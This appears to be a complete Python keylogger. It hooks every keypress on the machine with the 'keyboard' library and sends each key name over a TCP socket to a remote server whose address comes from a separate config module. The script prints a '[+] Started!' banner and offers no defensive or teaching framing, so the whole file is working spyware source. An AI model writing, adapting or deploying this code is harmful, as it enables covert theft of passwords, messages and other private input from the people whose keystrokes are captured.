import socket
import keyboard

# Server configuration
from info import *

def on_key_event(e):
    if e.event_type == keyboard.KEY_DOWN:
        print(e.name)
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client_socket.connect((IP, PORT))
        client_socket.sendall((e.name).encode('utf-8'))

print("[+] Started!")
keyboard.hook(on_key_event)
keyboard.wait()

# Close the connection
keyboard.unhook_all()
